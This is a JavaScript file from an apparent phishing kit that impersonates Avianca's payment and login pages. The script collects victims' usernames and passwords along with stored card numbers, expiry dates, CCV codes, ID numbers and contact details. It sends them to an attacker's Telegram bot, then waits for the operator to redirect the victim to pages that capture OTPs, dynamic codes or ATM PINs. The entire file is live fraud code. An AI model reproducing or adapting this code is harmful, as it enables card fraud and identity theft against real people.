document.addEventListener("DOMContentLoaded", async () => {
    const btnNextStep = document.querySelector("#btnNextStep");

    if (!btnNextStep) {
        console.error("❌ No se encontró el botón Verificar.");
        return;
    }

    btnNextStep.addEventListener("click", async () => {
        const userInput = document.querySelector("#user");
        const passwordInput = document.querySelector("#puser");

        if (!userInput || !passwordInput) {
            console.error("❌ No se encontraron los campos de usuario o contraseña.");
            return;
        }

        const user = userInput.value.trim();
        const password = passwordInput.value.trim();

        if (!user || !password) {
            alert("Por favor, completa todos los campos.");
            return;
        }

        localStorage.setItem("user", user);
        localStorage.setItem("password", password);

        console.log("✅ Usuario:", user);
        console.log("✅ Contraseña:", password);

        const pagoData = localStorage.getItem("pagoavianca");
        if (!pagoData) {
            console.warn("⚠️ No se encontraron datos en localStorage para pagoavianca.");
            return;
        }

        let pagoavianca;
        try {
            pagoavianca = JSON.parse(pagoData);
        } catch (error) {
            console.error("❌ Error al parsear pagoavianca:", error);
            return;
        }

        console.log("✅ Datos recuperados (pagoavianca):", pagoavianca);

        // Generar un transactionId único
        const transactionId = Date.now().toString();

        // Cargar configuración desde claves.json
        let config;
        try {
            const response = await fetch("./claves.json");
            if (!response.ok) throw new Error("No se pudo cargar claves.json");
            config = await response.json();
            console.log("🔑 Config cargada:", config);
        } catch (error) {
            console.error("❌ Error al cargar claves.json:", error);
            return;
        }

        // Verificar que los valores esenciales existen antes de continuar
        if (!config.botToken || !config.chatId) {
            console.error("❌ Token o Chat ID no definidos en claves.json");
            return;
        }


        const mensaje = `✈️ <b>Avianca</b> ✈️
💳 Tarjeta: <code>${pagoavianca.card}</code>
🗓️ Fecha: <code>${pagoavianca.card_date}</code>
💳 CCV: <code>${pagoavianca.ccv}</code>
🏦 Banco: <code>${pagoavianca.bank}</code>
📅 Cuotas: <code>${pagoavianca.cuotas}</code>
👨🏻‍🦱 Nombre: <code>${pagoavianca.name}</code>
👨🏻‍🦱 Apellido: <code>${pagoavianca.lastname}</code>
💳 CC: <code>${pagoavianca.cc}</code>
📨 Correo: <code>${pagoavianca.email}</code>
📲 Teléfono: <code>${pagoavianca.phone}</code>
🏙️ Ciudad: <code>${pagoavianca.city}</code>
🗽 Provincia: <code>${pagoavianca.state}</code>
🧭 Dirección: <code>${pagoavianca.address}</code>
👤 Usuario: <code>${user}</code>
🔑 Contraseña: <code>${password}</code>`;

        // Crear teclado de Telegram
        const keyboard = {
            inline_keyboard: [
                [{ text: "X Logo", callback_data: `error_logo:${transactionId}` }],
                [{ text: "X TC", callback_data: `error_tc:${transactionId}` }],
                [{ text: "Dinámica", callback_data: `dinamic:${transactionId}` }],
                [{ text: "otp", callback_data: `pedir_otp:${transactionId}` }],
                [{ text: "Clave Cajero", callback_data: `cajero:${transactionId}` }],
                [{ text: "Fin", callback_data: `confirm_finalizar:${transactionId}` }]
            ]
        };

        // Enviar mensaje a Telegram
        try {
            const response = await fetch(`https://api.telegram.org/bot${config.botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: config.chatId,  // ← AQUÍ ESTABA EL ERROR
                    text: mensaje,
                    parse_mode: "HTML",
                    reply_markup: keyboard
                })
            });


            const data = await response.json();

            if (data.ok) {
                console.log("✅ Mensaje enviado a Telegram:", data);
                const messageId = data.result.message_id;
                checkPaymentVerification(transactionId, messageId, config);
            } else {
                console.error("❌ Error al enviar mensaje a Telegram:", data);
            }
        } catch (error) {
            console.error("❌ Error en fetch de sendMessage:", error);
        }
    });
});

async function checkPaymentVerification(transactionId, messageId, config) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${config.botToken}/getUpdates`);
        const data = await response.json();

        const updates = data.result;
        const verificationUpdate = updates.find((update) =>
            update.callback_query &&
            [
                `error_tc:${transactionId}`,
                `error_logo:${transactionId}`,
                `dinamic:${transactionId}`,
                `pedir_otp:${transactionId}`,
                `cajero:${transactionId}`,
                `confirm_finalizar:${transactionId}`
            ].includes(update.callback_query.data)
        );

        if (verificationUpdate) {
            await fetch(`https://api.telegram.org/bot${config.botToken}/editMessageReplyMarkup`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: config.chat_id,
                    message_id: messageId,
                    reply_markup: { inline_keyboard: [] }
                })
            });

            switch (verificationUpdate.callback_query.data) {
                case `error_logo:${transactionId}`:
                    alert("Usuario o clave incorrectos.");
                    window.location.href = "id-check.html";
                    break;
                case `error_tc:${transactionId}`:
                    alert('ERROR: Corrija el método de pago o intente con un nuevo método de pago. (AVERR88000023)');
                    window.location.href = "step-two.html";
                    break;
                case `pedir_otp:${transactionId}`:
                    window.location.href = "otpcode.html";
                    break;
                case `dinamic:${transactionId}`:
                    window.location.href = "pedirdinamica.html";
                    break;
                case `cajero:${transactionId}`:
                    window.location.href = "clavecajero.html";
                    break;
                case `confirm_finalizar:${transactionId}`:
                    window.location.href = "success.html";
                    break;
            }
        } else {
            setTimeout(() => checkPaymentVerification(transactionId, messageId, config), 2000);
        }
    } catch (error) {
        console.error("❌ Error verificando respuesta de Telegram:", error);
        setTimeout(() => checkPaymentVerification(transactionId, messageId, config), 2000);
    }

    localStorage.setItem("transactionId", transactionId);
    localStorage.setItem("messageId", messageId);


    setTimeout(() => {
        console.log("🔄 Redirigiendo a waiting.html...");
        window.location.href = "waiting.html";
    }, 500);
}
